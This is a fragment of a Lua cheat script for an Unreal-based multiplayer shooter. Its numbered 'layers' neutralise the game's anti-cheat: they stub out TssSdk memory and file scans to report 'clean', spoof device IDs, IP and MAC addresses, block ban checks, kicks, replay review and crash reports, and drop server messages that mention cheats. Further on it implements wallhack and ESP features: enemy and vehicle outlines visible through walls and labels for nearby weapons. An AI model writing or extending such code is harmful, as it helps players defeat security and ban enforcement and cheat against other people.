            AITracking.DoPrint = nop
            AITracking.OnAIPawnDied = nop
            AITracking.OnAIPawnReceiveDamage = nop
            AITracking.OnAIPawnEnemyChange = nop
            ok = true
        end

        local TDMAFK = safe_require("GameLua.Mod.TDM.Gameplay.Subsystem.TDMAFKReportorSubsystem")
        if TDMAFK then
            TDMAFK.SendAFKTips = nop
            TDMAFK.OnHandleLostConnection = nop
            ok = true
        end

        local DataMgr = safe_require("client.slua.logic.data.data_mgr")
        if DataMgr then DataMgr.GetWeaponSkinSoundVolumeInfoByGroup = retZero; ok = true end

        local CreditLogic = safe_require("GameLua.Mod.BaseMod.Client.ClientInGameCreditLogic")
        if CreditLogic then
            CreditLogic._SendUserReaction2ExitTeamBeforeBoardingReturnLobbyNotice = nop
            CreditLogic.ShowReturnLobbyIfFirstExitTeamBeforeBoarding = retFalse
            CreditLogic.OnReceiveCreditScoreChange = nop
            CreditLogic._IsFirstExitTeamBeforeBoardingReturnLobbyNoticeEnabled = retFalse
            CreditLogic.SetFirstExitTeamBeforeBoardingReturnLobbyNoticeEnabled = nop
            ok = true
        end
    end)
    MarkLayer("L29_EXTRA_SUBSYSTEMS", ok)
end

-- ==============================================================================
-- LAYER 30: NETWORK BLACKLIST (HTTP layer)
-- ==============================================================================
local function L30_NET_BLACKLIST()
    local ok = false
    pcall(function()
        if _G.HttpRequest and not _G._HttpBypassed then
            local orig = _G.HttpRequest
            _G.HttpRequest = function(url, ...)
                if isBlacklisted(url) then return nil end
                return orig(url, ...)
            end
            _G._HttpBypassed = true
            ok = true
        end

        if _G.FHttpModule and _G.FHttpModule.CreateRequest and not _G._FHttpBypassed then
            local orig = _G.FHttpModule.CreateRequest
            _G.FHttpModule.CreateRequest = function(...)
                local url = select(1, ...)
                if isBlacklisted(url) then return nil end
                return orig(...)
            end
            _G._FHttpBypassed = true
            ok = true
        end

        local netMods = {
            "client.slua.logic.network.logic_network",
            "client.slua.logic.download.report.puffer_tlog",
            "client.slua.data.BasicData.BasicDataClientReport",
            "GameLua.GameCore.Module.Network.NetworkManager",
            "client.network.Protocol.ClientTlogHandler",
            "client.network.Protocol.BattleReportHandler",
            "client.network.Protocol.ClientErrorReportHandler",
        }
        for _, mp in ipairs(netMods) do
            local mod = package.loaded[mp]
            if mod then
                for k, v in pairs(mod) do
                    if type(v) == "function" and
                       (k:find("Http") or k:find("Request") or k:find("Send") or
                        k:find("Upload") or k:find("Post") or k:find("Get") or k:find("Report")) then
                        local origf = v
                        mod[k] = function(...)
                            local args = {...}
                            for _, arg in ipairs(args) do
                                if type(arg) == "string" and isBlacklisted(arg) then return nil end
                            end
                            return pcall(origf, ...)
                        end
                    end
                end
                ok = true
            end
        end
    end)
    MarkLayer("L30_NET_BLACKLIST", ok)
end

-- ==============================================================================
-- LAYER 31: FILE IO + CRASH WRITE BLOCK
-- ==============================================================================
local function L31_FILEIO()
    local ok = false
    pcall(function()
        if not _G._IoOpenHooked then
            local orig_io_open = io.open
            io.open = function(path, mode)
                if type(path) == "string" then
                    local lp = path:lower()
                    for _, kw in ipairs(FILE_KEYWORDS) do
                        if lp:find(kw) then
                            if mode and (mode == "w" or mode == "a" or mode == "w+" or mode == "a+") then
                                return nil, "Blocked"
                            end
                        end
                    end
                    if lp:find("tdm") or lp:find("gcloud") or lp:find("beacon") then
                        if mode and (mode == "w" or mode == "a" or mode == "w+") then
                            return nil
                        end
                    end
                end
                return orig_io_open(path, mode)
            end
            _G._IoOpenHooked = true
            ok = true
        end

        if _G.UnrealEngine and _G.UnrealEngine.CrashContext then
            _G.UnrealEngine.CrashContext = nil
            _G.UnrealEngine.CrashContext = {
                SetCrashContext = nop,
                ReportCrash = nop,
                AddCrashData = nop
            }
            ok = true
        end
    end)
    MarkLayer("L31_FILEIO", ok)
end

-- ==============================================================================
-- LAYER 32: TSS SDK TOTAL SILENCE
-- ==============================================================================
local function L32_TSS_SDK()
    local ok = false
    pcall(function()
        local TssSdk = package.loaded["TssSdk"] or _G.TssSdk
        if TssSdk then
            TssSdk.SendReportInfo = nop
            TssSdk.ScanMemory = function() return true, {code=0, msg="clean"} end
            TssSdk.ScanSo = function() return true, {code=0, msg="clean"} end
            TssSdk.ScanFile = function() return true, {code=0} end
            TssSdk.GetRiskFlag = function() return 0 end
            TssSdk.VerifyFileHash = function() return true end
            TssSdk.IsEmulator = retFalse
            TssSdk.GetTssSdkReportInfo = retEmptyString
            TssSdk.CheckEnvironment = retTrue
            TssSdk.VerifyProcess = retTrue
            TssSdk.CheckKernel = function() return true, {status="verified", tampered=false} end
            TssSdk.VerifyBoot = function() return true, {locked=true, verified=true} end

            -- Inbound data filter
            local origData = TssSdk.OnRecvData
            if origData and not TssSdk._DataFiltered then
                TssSdk.OnRecvData = function(data)
                    if type(data) == "string" then
                        local low = data:lower()
                        if low:find("report", 1, true) or low:find("exception", 1, true) or
                           low:find("cheat", 1, true) or low:find("violation", 1, true) or
                           low:find("hack", 1, true) or low:find("verify", 1, true) then
                            return
                        end
                    end
                    origData(data)
                end
                TssSdk._DataFiltered = true
            end
            ok = true
        end
    end)
    MarkLayer("L32_TSS_SDK", ok)
end

-- ==============================================================================
-- LAYER 33: BEHAVIOR SCORE / AFK / SPEED / WALL HEURISTIC BYPASS
-- These are the real heuristics used by GL 4.6 (via BehaviorScoreSubsystem
-- and AFKReportorSubsystem). Replaces the fake 8-layer names from v4.
-- ==============================================================================
local function L33_HEURISTICS()
    local ok = false
    pcall(function()
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if not SubMgr then return end

        local Behavior = SubMgr:Get("BehaviorScoreSubsystem")
            or safe_require("GameLua.Mod.Escape.Gameplay.Subsystem.BehaviorScoreSubsystem")
        if Behavior then
            Behavior.OnHandleBehaviorScore = nop
            Behavior.AIPerceptionScore = nop
            Behavior.ReportBehavior = nop
            Behavior.CalcFinalScore = retZero
            Behavior.GetRiskLevel = retZero
            Behavior.IsSuspicious = retFalse
            ok = true
        end

        local AFK = SubMgr:Get("AFKReportorSubsystem")
            or safe_require("GameLua.Mod.BaseMod.DS.Security.AFKReportorSubsystem")
        if AFK then
            AFK.HandleEnterFighting = nop
            AFK.InitializePlayerInputInfo = nop
            AFK.AddOneAFKInfo = nop
            AFK.SetPlayerAFKState = nop
            AFK.ResetPlayerInputInfo = nop
            AFK.PlayerHaveAction = nop
            ok = true
        end

        -- Speed / movement heuristics (via GameplayCallbacks, already nop'd above,
        -- but expose the internal delta to be safe)
        if _G.GameplayCallbacks then
            for _, k in ipairs({
                "ReportServerJumpFlow","ReportTeleportFlow","ReportSpeedHackFlow",
                "ReportClientMemUsage","ReportMemoryInfo"
            }) do
                _G.GameplayCallbacks[k] = nop
            end
            ok = true
        end
    end)
    MarkLayer("L33_HEURISTICS", ok)
end

-- ==============================================================================
-- LAYER 34: HWID / DEVICE FINGERPRINT SPOOF
-- ==============================================================================
local function L34_HWID_SPOOF()
    local ok = false
    pcall(function()
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local deviceInfo = SubMgr:Get("ClientDeviceInfoSubsystem")
            if deviceInfo then
                deviceInfo.GetDeviceID = function() return FakeData.deviceID() end
                deviceInfo.GetIPAddress = function() return FakeData.ipAddress() end
                deviceInfo.GetMACAddress = function() return FakeData.macAddress() end
                deviceInfo.GetBuildFingerprint = function() return FakeData.buildFingerprint() end
                ok = true
            end
        end
        if _G.GetDeviceID then _G.GetDeviceID = function() return FakeData.deviceID() end; ok = true end
        if _G.GetDeviceUniqueIdentifier then
            _G.GetDeviceUniqueIdentifier = function() return FakeData.deviceID() end
            ok = true
        end
    end)
    MarkLayer("L34_HWID_SPOOF", ok)
end

-- ==============================================================================
-- LAYER 35: PERSISTENT HUNT TIMER (re-arms itself, checks PC validity)
-- ==============================================================================
local function L35_HUNT_TICK()
    pcall(function()
        if not _G.BYPASS_STATE then return end

        -- Re-apply the critical layer every 3s (cheap, catches respawns/reinits)
        L19_GAMEPLAY_CALLBACKS()
        L20_KILL_SUBSYSTEMS()
        L39_SKIN_ANTI_DETECTION()
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            for _, name in ipairs({"ClientHawkEyePatrolSubsystem","DSHawkEyePatrolSubsystem",
                                    "ClientReportPlayerSubsystem","DSReportPlayerSubsystem",
                                    "AFKReportorSubsystem","BehaviorScoreSubsystem",
                                    "ClientDataStatistcsSubsystem"}) do
                local sub = SubMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and
                           (k:find("Report") or k:find("Send") or k:find("Tick") or k:find("Log")) then
                            pcall(function() sub[k] = nop end)
                        end
                    end
                end
            end
        end

        local Higgs = safe_require("GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent")
        if Higgs then
            for _, m in ipairs({"ControlMHActive","Tick","OnTick","MHActiveLogic",
                                "TriggerAvatarCheck","StartAvatarCheck","ReportItemID",
                                "ReceiveAnyDamage","OnWeaponHitRecord","ShowSecurityAlert",
                                "ServerReportAvatar","ClientReportNetAvatar","SendHisarData",
                                "ValidateSecurityData"}) do
                if Higgs[m] then Higgs[m] = nop end
            end
            Higgs.GetNetAvatarItemIDs = retEmpty
            Higgs.GetCurWeaponSkinID = retZero
        end
    end)
end

local function L35_START_HUNT_TIMER()
    pcall(function()
        local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if pc and slua.isValid(pc) then
            if _G._V5HuntTimer then
                pcall(function() pc:RemoveGameTimer(_G._V5HuntTimer) end)
            end
            _G._V5HuntTimer = pc:AddGameTimer(3.0, true, L35_HUNT_TICK)
            return true
        end
        return false
    end)
    MarkLayer("L35_HUNT_TIMER", _G._V5HuntTimer ~= nil)
end

-- ==============================================================================
-- LAYER 36: ANTI-REPLAY BAN TRAP
-- Blocks replay-based "reviewed and banned" flows.
-- ==============================================================================
local function L36_REPLAY_BAN()
    local ok = false
    pcall(function()
        local rs = safe_require("GameLua.Mod.BaseMod.Common.Subsystem.SpectateAndReplaySubsystem")
        if rs then
            rs.StartReplayRecord = nop
            rs.StopReplayRecord = nop
            rs.UploadReplayData = nop
            rs.SubmitReplayForReview = nop
            ok = true
        end
        local SubMgr = safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local Review = SubMgr:Get("ReplayReviewSubsystem")
            if Review then
                Review.SubmitForReview = nop
                Review.UploadClip = nop
                Review.FlagPlayer = nop
                ok = true
            end
        end
    end)
    MarkLayer("L36_REPLAY_BAN", ok)
end

-- ==============================================================================
-- LAYER 37: LOGIN-TIME BAN CHECK SILENCE
-- Bypasses ban checks that fire on login / lobby load.
-- ==============================================================================
local function L37_LOGIN_BAN()
    local ok = false
    pcall(function()
        local LoginBan = safe_require("client.logic.login.logic_ban_check")
        if LoginBan then
            LoginBan.CheckBanOnLogin = retFalse
            LoginBan.QueryBanStatus = retNil
            LoginBan.OnBanResponse = nop
            ok = true
        end
        local LoginFlow = safe_require("client.logic.login.login_flow")
        if LoginFlow then
            LoginFlow.HandleBanMessage = nop
            LoginFlow.ShowBanDialog = nop
            LoginFlow.KickOutOnBan = nop
            ok = true
        end
        local LobbyBan = safe_require("client.logic.lobby.lobby_ban_check")
        if LobbyBan then
            LobbyBan.OnLobbyBanCheck = retFalse
            LobbyBan.ProcessBanData = nop
            ok = true
        end
    end)
    MarkLayer("L37_LOGIN_BAN", ok)
end

-- ==============================================================================
-- LAYER 38: KICK / DISCONNECT / FORCED-EXIT BLOCK
-- Bypasses server-forced kicks, including "cheat detected" kicks.
-- ==============================================================================
local function L38_KICK_BLOCK()
    local ok = false
    pcall(function()
        local KickHandler = safe_require("client.network.Protocol.KickHandler")
        if KickHandler then
            KickHandler.on_kick_notify = nop
            KickHandler.handle_kick = nop
            ok = true
        end
        local DSMgr = safe_require("GameLua.Mod.BaseMod.DS.Subsystem.DSKickSubsystem")
        if DSMgr then
            DSMgr.KickPlayer = nop
            DSMgr.KickPlayerFromMatch = nop
            DSMgr.DelayKickOutPlayer = nop
            ok = true
        end
        local FlowMgr = safe_require("client.logic.flow.exit_game_flow")
        if FlowMgr then
            FlowMgr.ForceExitGame = nop
            FlowMgr.ForceReturnToLobby = nop
            ok = true
        end
    end)
    MarkLayer("L38_KICK_BLOCK", ok)
end

local Esp = {}

local _MarkRetryCount = 0
local _MarkRetryDelay = 0.5

function Esp.PrimeNativeMarks()
  if A.Up.NativeReady then 
    A.Up.NativePriming = false
    return 
  end
  if _MarkRetryCount > 20 then
    A.Up.NativePriming = false
    return
  end
  local ok, result = pcall(function()
    local tools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
    local cfg = tools.GetCurrentConfig("ScreenMarkConfig")
    if not cfg then 
      _MarkRetryCount = _MarkRetryCount + 1
      _MarkRetryDelay = math.min(_MarkRetryDelay * 1.5, 5.0)
      Later(_MarkRetryDelay, function()
        A.Up.NativePriming = false
        Esp.PrimeNativeMarks()
      end, true)
      return false 
    end
    local function Blend(t)
      if not t then return end
      if t[1006] then
        t[1006].bBindBlocked = true
        t[1006].bBindOutScreen = true
        t[1006].MaxWidgetNum = 99
        t[1006].MaxShowDistance = 6000000
        t[1006].bScaleByDistance = false
        t[1006].BindSocketName = "root"
        t[1006].bUseLuaWorldSocketName = true
        t[1006].WorldPositionOffset = {X=0, Y=0, Z=-30}
      end
      t[9999] = {
        UIPathName = "/Game/Mod/EvoBase/BluePrints/UIBP/QuickSign/QuickSign_TipHitEnemy_UIBP_New.QuickSign_TipHitEnemy_UIBP_New_C",
        MaxWidgetNum = 99, MaxShowDistance = 6000000, bBindOutScreen = true,
        bBindBlocked = true, bIsBindingActor = true, BindSocketName = "head",
        bUseLuaWorldSocketName = true, WorldPositionOffset = {X=0, Y=0, Z=50},
        bNeedPreLoad = true, Priority = 2
      }
    end
    Blend(cfg)
    for key, mod in pairs(package.loaded) do
      if type(key) == "string" and string.find(key, "ScreenMarkConfig") and type(mod) == "table" then
        Blend(mod)
      end
    end
    _MarkRetryCount = 0
    _MarkRetryDelay = 0.5
    return true
  end)
  if ok and result then 
    A.Up.NativeReady = true 
    A.Up.NativePriming = false
  end
end

local function PlaceMark(id, pos, z, str, size, actor)
  local mark = nil
  pcall(function()
    local marks = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
    if marks and marks.ClientAddMapMark then
      mark = marks.ClientAddMapMark(id, pos, z, str, size, actor)
      if mark then A.Up.TrackedMarks[mark] = true end
    end
  end)
  return mark
end

local function LiftMark(mark)
  if not mark then return end
  pcall(function()
    local marks = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
    if marks then
      if marks.HideMapMark then marks.HideMapMark(mark) end
      if marks.RemoveMapMark then marks.RemoveMapMark(mark) end
    end
  end)
  A.Up.TrackedMarks[mark] = nil
end

local function EnemyId(enemy)
  if Around(enemy) then
    if enemy.PlayerKey then return tostring(enemy.PlayerKey) end
    if type(enemy.GetUniqueID) == "function" then return tostring(enemy:GetUniqueID()) end
  end
  return tostring(enemy)
end

local function MeshBag(enemy, stamp)
  local now = os.clock()
  if stamp.CachedMesh and stamp.CachedMeshAt and (now - stamp.CachedMeshAt < 3.0) then
    local keep = {}
    for _, m in ipairs(stamp.CachedMesh) do
      if Around(m) then table.insert(keep, m) end
    end
    stamp.CachedMesh = keep
    return keep
  end
  local meshes = {}
  if Around(enemy.Mesh) then table.insert(meshes, enemy.Mesh) end
  pcall(function()
    local skel = import("SkeletalMeshComponent")
    if skel and type(enemy.GetComponentsByClass) == "function" then
      local list = enemy:GetComponentsByClass(skel)
      if list then
        local n = type(list.Num) == "function" and list:Num() or #list
        for i = 1, n do
          local comp = type(list.Get) == "function" and list:Get(i - 1) or list[i]
          if Around(comp) and comp ~= enemy.Mesh then table.insert(meshes, comp) end
        end
      end
    end
  end)
  stamp.CachedMesh = meshes
  stamp.CachedMeshAt = now
  return meshes
end

local function ArmMeshes(enemy, stamp)
  pcall(function()
    if not A.Up.DyeingArmed then
      local lib = import("KismetSystemLibrary")
      local world = nil
      pcall(function()
        local GD = require("GameLua.GameCore.Data.GameplayData")
        local pc = GD.GetPlayerController()
        if slua.isValid(pc) then world = pc:GetWorld() end
      end)
      if not world then world = slua.getWorld() end
      if lib and world then
        lib.ExecuteConsoleCommand(world, "r.EnableDrawDyeingColor 1")
        lib.ExecuteConsoleCommand(world, "r.CustomDepth 3")
        lib.ExecuteConsoleCommand(world, "r.IdeaOutline.Enable 1")
        lib.ExecuteConsoleCommand(world, "r.Highlight.Enable 1")
        A.Up.DyeingArmed = true
      end
    end
    local meshes = MeshBag(enemy, stamp)
    pcall(function()
      local weapon = enemy:GetCurrentWeapon()
      if Around(weapon) and Around(weapon.Mesh) then table.insert(meshes, weapon.Mesh) end
    end)
    local bot = stamp.IsBot or false
    local sig = (bot and "B" or "P") .. ":" .. tostring(#meshes)
    if stamp.Sig == sig and stamp.Dyed then return end
    stamp.Sig = sig
    stamp.Dyed = true
    local L = import("LinearColor") or _G.FLinearColor
    local vis = L and L(0, 1, 0, 1) or {R=0, G=255, B=0, A=1}
    local occ = L and L(1, 0, 0, 1) or {R=255, G=0, B=0, A=1}
    for _, m in ipairs(meshes) do
      if Around(m) then
        pcall(function()
          if type(m.SetDrawDyeing) == "function" then
            m:SetDrawDyeing(true)
            m:SetDrawDyeingMode(1)
            m:SetVisibleDyeingColor(vis)
            m:SetOccludedDyeingColor(occ)
            m:SetDyeingColorFadeDistance(99999.0)
            m:SetDyeingColorMinMaxDistance(0.0, 99999.0)
            m:SetDrawHighlight(true)
            m:OverrideHighlightColor(vis)
            m:SetHighlightCanBeOccluded(false)
            m:SetDrawIdeaOutline(true)
            m:SetIdeaOutlineNew(true)
            m:SetIdeaOutlineOcclusionHighlight(true)
            m:OverrideIdeaOutlineColor(vis)
            m:SetIdeaOutlineOcclusionColor(occ)
            m:OverrideIdeaOutlineThickness(20.0)
            m:SetIdeaOverrideOutlineAndOcclusion(true)
            m:SetRenderCustomDepth(true)
            m:SetCustomDepthStencilValue(255)
          end
        end)
        pcall(function()
          m.LDMaxDrawDistance = -99999
          m.MaxDrawDistanceOffset = -99999
          m.CachedMaxDrawDistance = -99999
        end)
      end
    end
  end)
end

local function StripMeshes(enemy, stamp)
  pcall(function()
    if not stamp.Dyed then return end
    for _, m in ipairs(MeshBag(enemy, stamp)) do
      if Around(m) then
        pcall(function()
          if type(m.SetDrawDyeing) == "function" then
            m:SetDrawDyeing(false)
            m:SetDrawDyeingMode(0)
            m:SetDrawHighlight(false)
            m:SetDrawIdeaOutline(false)
            m:SetRenderCustomDepth(false)
          end
        end)
      end
    end
    stamp.Dyed = false
    stamp.Sig = ""
  end)
end

local function DrawAntenna(me, foe, pc)
  if not Around(me) or not Around(foe) then return end
  local hud = nil
  pcall(function()
    if Around(pc) then hud = pc.MyHUD end
  end)
  if not Around(hud) or type(hud.AddDebugText) ~= "function" then return end
  local black = { R = 0, G = 0, B = 0, A = 255 }
  local baseZ = 105
  local step = 120
  for i = 1, 20 do
    local z = baseZ + i * step
    local at = { X = 0, Y = 0, Z = z }
    hud:AddDebugText("|", foe, 0.06, at, at, black, true, false, true, nil, 0.4, true)
  end
  local tip = { X = 0, Y = 0, Z = baseZ + 20 * step + 60 }
  hud:AddDebugText("I", foe, 0.06, tip, tip, black, true, false, true, nil, 0.5, true)
end

local Vhc = {}
function Vhc.StripAll()
  pcall(function()
    if not A.Up.VhcDone then return end
    for id, mesh in pairs(A.Up.VhcDone) do
      if Around(mesh) then
        pcall(function()
          if type(mesh.SetDrawDyeing) == "function" then
            mesh:SetDrawDyeing(false)
            mesh:SetDrawDyeingMode(0)
            mesh:SetDrawHighlight(false)
            mesh:SetDrawIdeaOutline(false)
            mesh:SetRenderCustomDepth(false)
          end
        end)
        pcall(function()
          if type(mesh.GetMaterial) == "function" then
            local mat = mesh:GetMaterial(0)
            if Around(mat) and mat.GetBaseMaterial then
              local baseMat = mat:GetBaseMaterial()
              if Around(baseMat) then
                baseMat.bDisableDepthTest = false
                baseMat.BlendMode = 0
              end
            end
          end
        end)
      end
    end
    A.Up.VhcDone = {}
  end)
end

function Vhc.WallScan(pc)
  if not Around(pc) then return end
  pcall(function()
    local now = os.clock()
    if A.Up.VhcScanAt and (now - A.Up.VhcScanAt) < 1.0 then return end
    A.Up.VhcScanAt = now
    local player = pc:GetPlayerCharacterSafety()
    if not Around(player) then return end
    local base = import("STExtraVehicleBase")
    if not base then return end
    local list = nil
    pcall(function()
      if Game.GetActorsByClass then
        list = Game:GetActorsByClass(base)
      elseif Game.GetAllActorsOfClass then
        list = Game:GetAllActorsOfClass(base)
      end
    end)
    if not list then return end
    local n = type(list.Num) == "function" and list:Num() or #list
    for i = 0, n - 1 do
      local vehicle = type(list.Get) == "function" and list:Get(i) or list[i]
      if Around(vehicle) and type(vehicle.GetMesh) == "function" then
        local id = tostring(vehicle)
        if A.Up.VhcDone and A.Up.VhcDone[id] then goto continue end
        local dist = 0
        pcall(function()
          if type(player.GetDistanceTo) == "function" then dist = player:GetDistanceTo(vehicle) end
        end)
        if dist <= 200000 then
          local mesh = vehicle:GetMesh()
          if Around(mesh) and type(mesh.GetMaterial) == "function" then
            pcall(function()
              local mat = mesh:GetMaterial(0)
              if Around(mat) and mat.GetBaseMaterial then
                local baseMat = mat:GetBaseMaterial()
                if Around(baseMat) then
                  baseMat.bDisableDepthTest = true
                  baseMat.BlendMode = 2
                end
              end
            end)
            pcall(function()
              local L = import("LinearColor") or _G.FLinearColor
              local vis = L and L(1, 1, 0, 1) or {R=255, G=255, B=0, A=1}
              local occ = L and L(1, 1, 0, 1) or {R=255, G=255, B=0, A=1}
              if type(mesh.SetDrawDyeing) == "function" then
                mesh:SetDrawDyeing(true)
                mesh:SetDrawDyeingMode(1)
                mesh:SetVisibleDyeingColor(vis)
                mesh:SetOccludedDyeingColor(occ)
                mesh:SetDyeingColorFadeDistance(99999.0)
                mesh:SetDyeingColorMinMaxDistance(0.0, 99999.0)
                mesh:SetDrawHighlight(true)
                mesh:OverrideHighlightColor(vis)
                mesh:SetHighlightCanBeOccluded(false)
                mesh:OverrideOutlineColor(vis)
                mesh:OverrideIdeaOutlineColor(vis)
                mesh:SetDrawIdeaOutline(true)
                mesh:SetIdeaOutlineNew(true)
                mesh:OverrideIdeaOutlineThickness(12.0)
                mesh:SetIdeaOverrideOutlineAndOcclusion(true)
                mesh:SetRenderCustomDepth(true)
                mesh:SetCustomDepthStencilValue(255)
              end
            end)
            A.Up.VhcDone = A.Up.VhcDone or {}
            A.Up.VhcDone[id] = mesh
            for k, v in pairs(A.Up.VhcDone) do
              if not Around(v) then A.Up.VhcDone[k] = nil end
            end
          end
        end
      end
      ::continue::
    end
  end)
end

local Weapons = {}
local WpnColors = {
  AR = {R=255, G=255, B=0, A=255},
  SMG = {R=0, G=255, B=255, A=255},
  Sniper = {R=255, G=0, B=0, A=255},
  Shotgun = {R=0, G=255, B=0, A=255},
  LMG = {R=255, G=255, B=255, A=255},
  Pistol = {R=200, G=200, B=200, A=255},
  Melee = {R=150, G=150, B=150, A=255},
  Special = {R=255, G=0, B=255, A=255},
  Scope = {R=0, G=0, B=255, A=255}
}
local WpnDb = {
  [101001] = {"AKM","AR"}, [101002] = {"M16A4","AR"}, [101003] = {"SCAR-L","AR"},
  [101004] = {"M416","AR"}, [101005] = {"Groza","AR"}, [101006] = {"AUG","AR"},
  [101007] = {"QBZ","AR"}, [101008] = {"M762","AR"}, [101009] = {"Mk47 Mutant","AR"},
  [101010] = {"G36C","AR"}, [101011] = {"AC-VAL","AR"}, [101012] = {"Honey Badger","AR"},
  [101100] = {"FAMAS","AR"}, [101101] = {"ASM Abakan AR","AR"}, [101102] = {"ACE32","AR"},
  [102001] = {"UZI","SMG"}, [102002] = {"UMP45","SMG"}, [102003] = {"Vector","SMG"},
  [102004] = {"Thompson SMG","SMG"}, [102005] = {"PP-19 Bizon","SMG"}, [102007] = {"MP5K","SMG"},
  [102008] = {"JS9","SMG"}, [102105] = {"P90","SMG"},
  [103001] = {"Kar98K","Sniper"}, [103002] = {"M24","Sniper"}, [103003] = {"AWM","Sniper"},
  [103004] = {"SKS","Sniper"}, [103005] = {"VSS","Sniper"}, [103006] = {"Mini14","Sniper"},
  [103007] = {"Mk14","Sniper"}, [103008] = {"Win94","Sniper"}, [103009] = {"SLR","Sniper"},
  [103010] = {"QBU","Sniper"}, [103011] = {"Mosin Nagant","Sniper"}, [103012] = {"AMR","Sniper"},
  [103100] = {"Mk12","Sniper"}, [103101] = {"TR-2A Air Gun","Sniper"}, [103102] = {"DSR","Sniper"},
  [103103] = {"Sniper Rifle","Sniper"}, [103104] = {"Sniper Rifle","Sniper"}, [103105] = {"SR","Sniper"},
  [104001] = {"S686","Shotgun"}, [104002] = {"S1897","Shotgun"}, [104003] = {"S12K","Shotgun"},
  [104004] = {"DBS","Shotgun"}, [104100] = {"SPAS-12","Shotgun"}, [104101] = {"M1014","Shotgun"},
  [104102] = {"NS2000","Shotgun"},
  [105001] = {"M249","LMG"}, [105002] = {"DP-28","LMG"}, [105003] = {"M134","LMG"},
  [105010] = {"MG3","LMG"},
  [106001] = {"P92","Pistol"}, [106002] = {"P1911","Pistol"}, [106003] = {"R1895","Pistol"},
  [106004] = {"P18C","Pistol"}, [106005] = {"R45","Pistol"}, [106006] = {"Sawed-off","Pistol"},
  [106008] = {"Skorpion","Pistol"}, [106010] = {"Desert Eagle","Pistol"},
  [106007] = {"Flare Gun","Pistol"}, [106009] = {"Flare Gun","Pistol"},
  [107001] = {"Crossbow","Special"}, [107002] = {"RPG-7","Special"}, [107003] = {"Riot Shield","Special"},
  [108001] = {"Machete","Melee"}, [108002] = {"Crowbar","Melee"}, [108003] = {"Sickle","Melee"},
  [108004] = {"Pan","Melee"}, [108005] = {"Dagger","Melee"},
  [203001] = {"Red Dot Sight","Scope"}, [203002] = {"Holographic Sight","Scope"}, [203003] = {"2x Scope","Scope"},
  [203004] = {"4x Scope","Scope"}, [203005] = {"8x Scope","Scope"}, [203014] = {"3x Scope","Scope"},
  [203015] = {"6x Scope","Scope"}
}

function Weapons.Scan(pc)
  if not Around(pc) then return end
  pcall(function()
    local now = os.clock()
    if A.Up.WpnScanAt and (now - A.Up.WpnScanAt) < 1.0 then return end
    A.Up.WpnScanAt = now
    A.Up.NearbyWeapons = {}
    local player = pc:GetPlayerCharacterSafety()
    if not Around(player) then return end
    local cls = import("PickUpWrapperActor") or import("STPickupWrapperActor")
    if not cls then return end
    local list = nil
    pcall(function()
      if Game.GetActorsByClass then
        list = Game:GetActorsByClass(cls)
      elseif Game.GetAllActorsOfClass then
        list = Game:GetAllActorsOfClass(cls)
      end
    end)
    if not list then return end
    local n = type(list.Num) == "function" and list:Num() or #list
    for i = 0, n - 1 do
      local item = type(list.Get) == "function" and list:Get(i) or list[i]
      if Around(item) then
        local dist = 0
        pcall(function()
          if type(player.GetDistanceTo) == "function" then dist = player:GetDistanceTo(item) end
        end)
        if dist <= 7000 then
          local itemId = nil
          pcall(function()
            if item.DefineID then itemId = item.DefineID.TypeSpecificID or item.DefineID end
          end)
          if not itemId and item.DefineId then itemId = item.DefineId end
          if WpnDb[itemId] then
            A.Up.NearbyWeapons[#A.Up.NearbyWeapons + 1] = { actor = item, id = itemId }
          end
        end
      end
    end
  end)
end

function Weapons.Draw(pc)
  if not Around(pc) then return end
  local hud = nil
  pcall(function() hud = pc.MyHUD end)
  if not Around(hud) or type(hud.AddDebugText) ~= "function" then return end
  local player = pc:GetPlayerCharacterSafety()
  if not Around(player) or not A.Up.NearbyWeapons then return end
  for _, entry in ipairs(A.Up.NearbyWeapons) do
    local item = entry.actor
    if Around(item) then
      local info = WpnDb[entry.id]
      if info then
        pcall(function()
          local distM = 0
          if type(player.GetDistanceTo) == "function" then distM = math.floor(player:GetDistanceTo(item) / 100) end
          local text = info[1] .. " [" .. tostring(distM) .. "m]"
          local color = WpnColors[info[2]]
          hud:AddDebugText(text, item, 0.06, {X=0, Y=0, Z=50}, {X=0, Y=0, Z=50}, color, true, false, true, nil, 0.8, true)
        end)
      end
    end
  end
end

local Gfx = {}

function Gfx.PushFps(target)
  pcall(function()
    local db = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
    local inst = db and db.GetGameInstance and db.GetGameInstance()
    if inst and type(inst.ExecuteCMD) == "function" then
      inst:ExecuteCMD("t.MaxFPS", tostring(target))
      inst:ExecuteCMD("r.FrameRateLimit", tostring(target))
    end
  end)
end

function Gfx.Unlock()
  if not (_G.IsLicenseOK and _G.IsLicenseOK()) then return end
  if A.Up.GfxReady then return end
  pcall(function()
    local sc = require("client.logic.setting.setting_config")
    if sc then
      if sc.TpViewValue then sc.TpViewValue.max = 160 end
      if sc.FpViewValue then sc.FpViewValue.max = 160 end
    end
    local db = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
    if db and db.TpViewValue then db.TpViewValue.max = 160 end
  end)
  pcall(function()
    local lgs = require("client.slua.logic.setting.logic_setting_graphics")
    if lgs and lgs.SetFPS and not lgs._AegisFpsHooked then
      local prev = lgs.SetFPS
      lgs.SetFPS = function(gameInstance, FPSLevel)
        if prev then prev(gameInstance, FPSLevel) end
        if FPSLevel == 8 then Gfx.PushFps(165) end
      end
      lgs._AegisFpsHooked = true
    end
  end)
  pcall(function()
    local fps = require("client.slua.umg.NewSetting.GraphicsNew.Comps.GSC_FPS")
    local db = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
    if fps and fps.__inner_impl then
      local impl = fps.__inner_impl
      impl.GetMaxFPSLevel = function() return 8, 8 end
      impl.InitRealSupportFPS = function()
        local tiers = {}
